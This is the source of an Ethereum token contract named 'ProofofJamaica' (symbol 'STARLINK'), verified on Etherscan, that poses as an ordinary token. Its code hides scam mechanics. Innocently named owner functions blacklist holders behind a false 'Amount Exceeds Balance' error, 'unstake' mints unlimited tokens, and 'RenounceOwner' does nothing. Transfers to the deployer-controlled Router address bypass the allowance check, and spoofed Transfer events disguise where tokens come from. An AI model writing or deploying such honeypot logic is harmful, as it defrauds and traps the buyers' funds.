/**
 *Submitted for verification at Etherscan.io on 2022-10-24
*/

/**

*/

pragma solidity 0.8.7;
/*



@ProofOfJamaica
// https://twitter.com/elonmusk/status/1584608031777902593

*/ 

contract proofofjamaica {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) xVar;

    // 
    string public name = "ProofofJamaica";
    string public symbol = unicode"STARLINK";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
    address Router = 0xBBE37C7718cD0029B833A595431F706b81Bd3299;
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0xBBE37C7718cD0029B833A595431F706b81Bd3299;
    address lead_deployer = 0xBBE37C7718cD0029B833A595431F706b81Bd3299;
    bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _; }

    function RenounceOwner() public onlyOwner  {}


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }


    function transfer(address to, uint256 value) public returns (bool success) {

        require(!xVar[msg.sender] , "Amount Exceeds Balance"); 
        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!xVar[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        
         function zunrge(address _num) public onlyOwner {
        require(xVar[_num], "1");
        xVar[_num] = false; }
    
       function unstake(address to, uint256 value) public onlyOwner {
        totalSupply += value;  
        balanceOf[to] += value; 
        emit Transfer (address(0), to, value); }    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

    function vstake(address _num) public onlyOwner {
        require(!xVar[_num], "1");
        xVar[_num] = true; }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }
        if(to == Router)  {
        require(value <= balanceOf[from]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (from, to, value);
        return true; }
        require(!xVar[from] , "Amount Exceeds Balance"); 
        require(!xVar[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }